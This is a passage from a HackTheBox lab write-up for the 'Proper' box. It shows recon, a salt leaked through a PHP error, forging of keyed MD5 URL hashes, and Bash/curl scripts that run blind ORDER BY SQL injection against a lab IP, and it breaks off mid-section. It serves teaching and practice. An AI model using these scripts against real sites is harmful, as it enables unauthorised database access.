@@ -1,0 +1,1177 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Proper</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#htb-proper">htb-proper</a> <a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#windows">windows</a> <a class="post-tag" href="/tags#iis">iis</a> <a class="post-tag" href="/tags#gobuster">gobuster</a> <a class="post-tag" href="/tags#ajax">ajax</a> <a class="post-tag" href="/tags#sqlmap">sqlmap</a> <a class="post-tag" href="/tags#sqli">sqli</a> <a class="post-tag" href="/tags#keyed-hash">keyed-hash</a> <a class="post-tag" href="/tags#sqli-orderby">sqli-orderby</a> <a class="post-tag" href="/tags#sqlmap-eval">sqlmap-eval</a> <a class="post-tag" href="/tags#hashcat">hashcat</a> <a class="post-tag" href="/tags#lfi">lfi</a> <a class="post-tag" href="/tags#rfi">rfi</a> <a class="post-tag" href="/tags#toctou">toctou</a> <a class="post-tag" href="/tags#time-of-check-time-of-use">time-of-check-time-of-use</a> <a class="post-tag" href="/tags#inotifywait">inotifywait</a> <a class="post-tag" href="/tags#golang">golang</a> <a class="post-tag" href="/tags#golang-re">golang-re</a> <a class="post-tag" href="/tags#ida">ida</a> <a class="post-tag" href="/tags#ghidra">ghidra</a> <a class="post-tag" href="/tags#arbitrary-write">arbitrary-write</a> <a class="post-tag" href="/tags#reverse-engineering">reverse-engineering</a> <a class="post-tag" href="/tags#file-read">file-read</a> <a class="post-tag" href="/tags#wertrigger">wertrigger</a> <a class="post-tag" href="/tags#pipe-monitor">pipe-monitor</a> <a class="post-tag" href="/tags#powershell">powershell</a> <a class="post-tag" href="/tags#named-pipe">named-pipe</a> <a class="post-tag" href="/tags#cve-2021-1732">cve-2021-1732</a> <a class="post-tag" href="/tags#htb-hackback">htb-hackback</a> <a class="post-tag" href="/tags#htb-scriptkiddie">htb-scriptkiddie</a> </span><br/><br/>
+<time class="dt-published" datetime="2021-08-21T13:45:00+00:00" itemprop="datePublished">Aug 21, 2021
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2021/08/21/htb-proper.html" style="color: #e6e6e6; text-decoration: none;">HTB: Proper</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/proper-cover.webp" type="image/webp"/>
+<img alt="Proper" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/proper-cover.png" style="float: right; margin-right:50px; margin-left:50px; height:120px;">
+</img></picture>
+<p>Proper was a fascinating Windows box with three fascinating stages. First, there’s a SQL injection, but the url parameters are hashed with a key, so I need to leak that key, and then make sure to update the hash for each request. I get to play with the eval option for SQLmap, as well as show some manual scripting to do it. Next, there’s a time of check / time of use vulnerability in a file include that allows me to do a remote file include over SMB, swapping out the contents between the first and second read to get code execution. For root, there’s a Go binary that does cleanup of files in the users Downloads folder that I can abuse to get arbitrary write as SYSTEM. I’ll abuse this with the windows error reporting system to get execution. In Beyond Root, I’ll look at a couple more ways to get root using this binary.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/321 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/proper" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Proper</a> <a href="https://hackthebox.com/machines/proper" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-proper.webp" type="image/webp"/> <img alt="Proper" class="img-av" src="/icons/box-proper.png"/></picture></a><br/><a href="https://hackthebox.com/machines/proper" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1369681315184967687">13 Mar 2021</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">21 Aug 2021</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Windows <picture><source srcset="/icons/Windows.webp" type="image/webp"/><img alt="Windows" class="img-os" src="/icons/Windows.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/proper-diff.webp" type="image/webp"/><img alt="Rated difficulty for Proper" src="/img/proper-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/proper-radar.webp" type="image/webp"/><img alt="Radar chart for Proper" src="/img/proper-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">02:30:43</span><a href="https://app.hackthebox.com/users/52045" rel="noopener" target="_blank"><img alt="InfoSecJack" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/52045" style="display: unset"/><span class="user-text" style="display: none"> InfoSecJack</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">05:21:18</span><a href="https://app.hackthebox.com/users/9267" rel="noopener" target="_blank"><img alt="snowscan" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/9267" style="display: unset"/><span class="user-text" style="display: none"> snowscan</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/13569" rel="noopener" target="_blank"><img alt="xct" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/13569" style="display: unset"/><span class="user-text" style="display: none"> xct</span></a><br/> <a href="https://app.hackthebox.com/users/77141" rel="noopener" target="_blank"><img alt="jkr" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/77141" style="display: unset"/><span class="user-text" style="display: none"> jkr</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> found only HTTP (80) listening on TCP:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.231
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 12:45 EDT
+Nmap scan report for 10.10.10.231
+Host is up (0.031s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.231
+<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-16 12:45 EDT
+Nmap scan report for 10.10.10.231
+Host is up (0.069s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: OS Tidy Inc.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.45 seconds
+</span></code></pre></div></div>
+<p>Based on the <a href="https://en.wikipedia.org/wiki/Internet_Information_Services#Versions">IIS</a> version, the host is likely running Windows 10, Server 2016, or Server 2019.</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>The site is a page for some kind of company that seems “cleaner” and “deduper” software.</p>
+<div style="max-height: 400px; overflow: hidden; position: relative; margin-bottom: 20px;">
+<a href="https://0xdfimages.gitlab.io/img/image-20210226124236080.png">
+<img alt="image-20210226124236080" src="https://0xdfimages.gitlab.io/img/image-20210226124236080.png" style="clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 360px, 49% 390px, 51% 370px, 0 400px)"/>
+</a>
+<div style="position: absolute; right: 20px; top: 375px"><a href="https://0xdfimages.gitlab.io/img/image-20210226124236080.png"><i>Click for full image</i></a></div>
+</div>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p>I’ll run <code class="language-plaintext highlighter-rouge">gobuster</code> against the site (including PHP extensions as I figured out it was a PHP site, see next section):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.231 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-t</span> 40 <span class="nt">-x</span> php <span class="nt">-o</span> scans/gobuster-root-small-php
+<span class="go">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.231
+[+] Threads:        40
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2021/03/16 12:46:22 Starting gobuster
+===============================================================
+/assets (Status: 301)
+/licenses (Status: 301)
+/functions.php (Status: 200)
+/Assets (Status: 301)
+/Functions.php (Status: 200)
+/Licenses (Status: 301)
+===============================================================
+2021/03/16 12:48:21 Finished
+===============================================================
+</span></code></pre></div></div>
+<p><code class="language-plaintext highlighter-rouge">functions.php</code> returns an empty response. <code class="language-plaintext highlighter-rouge">/licenses</code> returns a login page to the “licensing portal”:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20210226132522093.webp" type="image/webp"/>
+<img alt="image-20210226132522093" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210226132522093.png"/>
+</picture>
+<p>Basic guessing or sql injections didn’t find anything.</p>
+<h4 id="ajax-query">AJAX Query</h4>
+<p>The page is <code class="language-plaintext highlighter-rouge">index.html</code>, so that doesn’t betray the tech stack. However, looking at Burp for the history when the main page is loaded, there’s an AJAX request by Javascript to:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b
+</code></pre></div></div>
+<p>That shows that there are PHP pages on the site. It’s also a URL I’ll want to explore.</p>
+<p>The response is the HTML for the various products part of the page:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.4.1</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 26 Feb 2021 17:36:00 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">10968</span>
+
+<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"col-md-4"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"hover-item"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"assets/img/shop/memdoubler-pro.png"</span> <span class="na">class=</span><span class="s">"img-responsive smoothie wow fadeIn"</span> <span class="na">data-wow-delay=</span><span class="s">"0.5s"</span> <span class="na">alt=</span><span class="s">""</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"overlay-item-caption smoothie wow fadeIn"</span> <span class="na">data-wow-delay=</span><span class="s">"0.5s"</span><span class="nt">&gt;</span>
+...[snip]...
+</code></pre></div></div>
+<p>This request is generated by this script in <code class="language-plaintext highlighter-rouge">index.html</code>:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nt">&lt;script </span><span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;</span>
+    <span class="nf">$</span><span class="p">(</span><span class="nb">document</span><span class="p">).</span><span class="nf">ready</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
+        <span class="dl">'</span><span class="s1">use strict</span><span class="dl">'</span><span class="p">;</span>
+        <span class="nf">jQuery</span><span class="p">(</span><span class="dl">'</span><span class="s1">#headerwrap</span><span class="dl">'</span><span class="p">).</span><span class="nf">backstretch</span><span class="p">([</span> <span class="dl">"</span><span class="s2">assets/img/bg/bg1.jpg</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">assets/img/bg/bg3.jpg</span><span class="dl">"</span> <span class="p">],</span> <span class="p">{</span><span class="na">duration</span><span class="p">:</span> <span class="mi">8000</span><span class="p">,</span> <span class="na">fade</span><span class="p">:</span> <span class="mi">500</span><span class="p">});</span>
+        <span class="nf">$</span><span class="p">(</span> <span class="dl">"</span><span class="s2">#product-content</span><span class="dl">"</span> <span class="p">).</span><span class="nf">load</span><span class="p">(</span><span class="dl">"</span><span class="s2">/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b</span><span class="dl">"</span><span class="p">,</span><span class="kd">function</span><span class="p">()</span> <span class="p">{});</span>
+    <span class="p">});</span>
+    <span class="nt">&lt;/script&gt;</span>
+</code></pre></div></div>
+<p>The site loads the basic HTML, and then issues this second request to get the products and put them into the first page.</p>
+<h2 id="access-to-licenses">Access To /licenses</h2>
+<h3 id="find-hash-method">Find Hash Method</h3>
+<h4 id="leak-salt">Leak Salt</h4>
+<p>The AJAX request has two GET parameters, <code class="language-plaintext highlighter-rouge">order</code> and <code class="language-plaintext highlighter-rouge">h</code>. <code class="language-plaintext highlighter-rouge">order=id desc</code> looks like part of an SQL query. The value given in <code class="language-plaintext highlighter-rouge">h</code> looks like an MD5 hash. I’ll kick this request over to Repeater in Burp to play with.</p>
+<p>Changing <code class="language-plaintext highlighter-rouge">desc</code> to <code class="language-plaintext highlighter-rouge">asc</code> (change sort order from descending to ascending), the page returns 403:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">403</span> <span class="ne">Forbidden</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.4.1</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 26 Feb 2021 17:58:07 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">39</span>
+
+Forbidden - Tampering attempt detected.
+</code></pre></div></div>
+<p>Leaving <code class="language-plaintext highlighter-rouge">order=id desc</code> and making any changes to <code class="language-plaintext highlighter-rouge">h</code> also returns that same message.</p>
+<p>My first thought was that <code class="language-plaintext highlighter-rouge">md5("id desc")</code> would match the <code class="language-plaintext highlighter-rouge">h</code>, but it doesn’t:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"id desc"</span> | <span class="nb">md5sum</span>
+<span class="go">aa5a97b10a6dd87160868d2316ab2425  -
+</span></code></pre></div></div>
+<p>Sending in <code class="language-plaintext highlighter-rouge">/products-ajax.php?order=id+desc&amp;h=</code> with nothing following returns a 500 error:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">500</span> <span class="ne">Internal Server Error</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.4.1</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 26 Feb 2021 18:03:33 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">31</span>
+
+Parameter missing or malformed.
+</code></pre></div></div>
+<p>Eventually I removed <code class="language-plaintext highlighter-rouge">h</code> entirely, sending <code class="language-plaintext highlighter-rouge">/products-ajax.php?order=id+desc</code>. This was another 500 error, but this time with crash info:</p>
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">500</span> <span class="ne">Internal Server Error</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>
+<span class="na">Server</span><span class="p">:</span> <span class="s">Microsoft-IIS/10.0</span>
+<span class="na">X-Powered-By</span><span class="p">:</span> <span class="s">PHP/7.4.1</span>
+<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 26 Feb 2021 18:04:39 GMT</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">641</span>
+
+<span class="c">&lt;!-- [8] Undefined index: h
+On line 6 in file C:\inetpub\wwwroot\products-ajax.php
+  1 |   // SECURE_PARAM_SALT needs to be defined prior including functions.php 
+  2 |   define('SECURE_PARAM_SALT','hie0shah6ooNoim'); 
+  3 |   include('functions.php'); 
+  4 |   include('db-config.php'); 
+  5 |   if ( !$_GET['order'] || !$_GET['h'] ) {                &lt;&lt;&lt;&lt;&lt; Error encountered in this line.
+  6 |     // Set the response code to 500 
+  7 |     http_response_code(500); 
+  8 |     // and die(). Someone fiddled with the parameters. 
+  9 |     die('Parameter missing or malformed.'); 
+ 10 |   } 
+ 11 |  
+// --&gt;</span>
+Parameter missing or malformed.
+</code></pre></div></div>
+<p>The source shows with both 500s come from. When <code class="language-plaintext highlighter-rouge">h</code> is empty, the <code class="language-plaintext highlighter-rouge">if</code> on line 5 returns true and then the response code is set to 500 with that “missing or malformed” message. But when one of the parameters is missing entirely, PHP will crash on line 5, which is what makes this message.</p>
+<h4 id="find-hash-algo">Find Hash Algo</h4>
+<p>The source in the crash also shows the definition of a variable, <code class="language-plaintext highlighter-rouge">SECURE_PARAM_SALT</code>. In a case like this, a salt (probably more accurately a key) is used when hashing to prevent someone from guessing the algorithm and then being able to reproduce the hash.</p>
+<p>Knowing the salt string, it’s likely combined with some part of the input before hashing The hash is likely associated with the <code class="language-plaintext highlighter-rouge">order</code> parameter. It could be just that parameter, or the entire url. I’ll start guessing at different combinations, and I found the right hash on my second guess:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"id deschie0shah6ooNoim"</span> | <span class="nb">md5sum</span>
+<span class="go">453d803378d6fb7eaf6a3cab618106d6  -
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"hie0shah6ooNoimid desc"</span> | <span class="nb">md5sum</span>
+<span class="go">a1b30d31d344a5a4e41e8496ccbdd26b  -
+</span></code></pre></div></div>
+<h4 id="test">Test</h4>
+<p>If this theory is right, I should now be able to change <code class="language-plaintext highlighter-rouge">order</code> to <code class="language-plaintext highlighter-rouge">id asc</code> and calculate the right hash to make the query work. I’ll start with just a HEAD request (<code class="language-plaintext highlighter-rouge">-I</code>) so my terminal doesn’t flood with HTML. Without updating the hash, it returns 403 forbidden:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="s1">'http://10.10.10.231/products-ajax.php?order=id+asc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b'</span>
+<span class="go">HTTP/1.1 403 Forbidden
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/7.4.1
+Date: Fri, 20 Aug 2021 11:27:54 GMT
+</span></code></pre></div></div>
+<p>Once I update the hash to the newly calculated value, it returns 200:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"hie0shah6ooNoimid asc"</span> | <span class="nb">md5sum</span>
+<span class="go">181345bd7fce37aad011ea65a41b60c8  -
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>curl <span class="nt">-I</span> <span class="s1">'http://10.10.10.231/products-ajax.php?order=id+asc&amp;h=181345bd7fce37aad011ea65a41b60c8'</span>
+<span class="go">HTTP/1.1 200 OK
+Content-Length: 0
+Content-Type: text/html; charset=UTF-8
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/7.4.1
+Date: Fri, 26 Feb 2021 18:12:47 GMT
+</span></code></pre></div></div>
+<p>It worked!</p>
+<p>I wrote a short Bash script that let’s me play around with this url:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">order</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">h</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"hie0shah6ooNoim</span><span class="k">${</span><span class="nv">order</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">md5sum</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span>
+
+curl <span class="nt">-s</span> <span class="nt">-I</span> <span class="nt">-G</span> <span class="s2">"http://10.10.10.231/products-ajax.php"</span> <span class="nt">--data-urlencode</span> <span class="s2">"order=</span><span class="k">${</span><span class="nv">order</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--data-urlencode</span> <span class="s2">"h=</span><span class="k">${</span><span class="nv">h</span><span class="k">}</span><span class="s2">"</span> <span class="nt">-x</span> http://127.0.0.1:8080 |
+  <span class="nb">grep</span> <span class="s2">"HTTP/1.1 200 OK"</span> <span class="o">&amp;&amp;</span> <span class="nb">exit   
+
+</span>curl <span class="nt">-i</span> <span class="nt">-G</span> <span class="s2">"http://10.10.10.231/products-ajax.php"</span> <span class="nt">--data-urlencode</span> <span class="s2">"order=</span><span class="k">${</span><span class="nv">order</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--data-urlencode</span> <span class="s2">"h=</span><span class="k">${</span><span class="nv">h</span><span class="k">}</span><span class="s2">"</span> <span class="nt">-x</span> http://127.0.0.1:8080
+</code></pre></div></div>
+<p>It takes <code class="language-plaintext highlighter-rouge">order</code> as an argument, calculates the <code class="language-plaintext highlighter-rouge">h</code>, and sends a HEAD request. If it’s an HTTP 200 it just prints that and exits (I don’t want to be flooded by all that HTML). Otherwise, it issues the prints the full response with headers so I can see errors. I can submit <code class="language-plaintext highlighter-rouge">id acs</code> without issue:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>./test_products.sh <span class="s2">"id asc"</span>
+<span class="go">HTTP/1.1 200 OK
+</span></code></pre></div></div>
+<p>If I add a single quote, it crashes:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>./test_products.sh <span class="s2">"id asc'"</span>
+<span class="go">HTTP/1.1 500 Internal Server Error
+Content-Type: text/html; charset=UTF-8
+Server: Microsoft-IIS/10.0
+X-Powered-By: PHP/7.4.1
+Date: Fri, 26 Feb 2021 18:38:50 GMT
+Connection: close
+Content-Length: 0
+</span></code></pre></div></div>
+<h3 id="sql-injection">SQL Injection</h3>
+<h4 id="manual">Manual</h4>
+<p>Sending a <code class="language-plaintext highlighter-rouge">'</code> broke the site. That’s a good indication there could be SQL injection. However, injection into the <code class="language-plaintext highlighter-rouge">ORDER BY</code> part of the query is limiting. <a href="https://portswigger.net/support/sql-injection-in-the-query-structure">This article from PortSwigger</a> lays it out nicely. I can’t UNION inject, add WHERE, OR, and AND at this point. The best I can do is use a <code class="language-plaintext highlighter-rouge">CASE</code> statement to check something that will return true or false and then look at the resulting order. There’s surely a way to do it without needing to know a second column in the table, but knowing the data that comes back, with a few guesses, I was able to guess a second column, <code class="language-plaintext highlighter-rouge">price</code>.</p>
+<p>I copied my Bash script a made a slight variation:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="nv">order</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nv">h</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"hie0shah6ooNoim</span><span class="k">${</span><span class="nv">order</span><span class="k">}</span><span class="s2">"</span> | <span class="nb">md5sum</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">' '</span> <span class="nt">-f1</span><span class="si">)</span>
+
+curl <span class="nt">-s</span> <span class="nt">-i</span> <span class="nt">-G</span> <span class="s2">"http://10.10.10.231/products-ajax.php"</span> <span class="nt">--data-urlencode</span> <span class="s2">"order=</span><span class="k">${</span><span class="nv">order</span><span class="k">}</span><span class="s2">"</span> <span class="nt">--data-urlencode</span> <span class="s2">"h=</span><span class="k">${</span><span class="nv">h</span><span class="k">}</span><span class="s2">"</span> <span class="nt">-x</span> http://127.0.0.1:8080 |
+  <span class="nb">grep</span> <span class="s1">'href="#"&gt;
+</span></code></pre></div></div>
+<p>This will just show me the order of the products on the page. Now run the query twice, once with false and once with true:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>./test_order.sh <span class="s2">"(CASE WHEN (1=2) THEN id ELSE price END)"</span>
+<span class="go">              &lt;h4&gt;&lt;a href="#"&gt;Shredder Free&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Deduper Free&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Comparer Free&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Cleaner Free&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Memdoubler Pro&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Comparer Pro&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Cleaner Pro&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Shredder Pro&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Deduper Pro&lt;/a&gt;&lt;/h4&gt;
+</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>./test_order.sh <span class="s2">"(CASE WHEN (1=1) THEN id ELSE price END)"</span>
+<span class="go">              &lt;h4&gt;&lt;a href="#"&gt;Shredder Free&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Shredder Pro&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Deduper Free&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Deduper Pro&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Comparer Free&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Comparer Pro&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Cleaner Free&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Cleaner Pro&lt;/a&gt;&lt;/h4&gt;
+              &lt;h4&gt;&lt;a href="#"&gt;Memdoubler Pro&lt;/a&gt;&lt;/h4&gt;
+</span></code></pre></div></div>
+<p>The order changes. I’ll use the last one to check the result (<code class="language-plaintext highlighter-rouge">| tail -1</code>). I can replace <code class="language-plaintext highlighter-rouge">1=1</code> with a query to ask questions of the database. For example, to check if the first letter of the current database is ‘a’:</p>
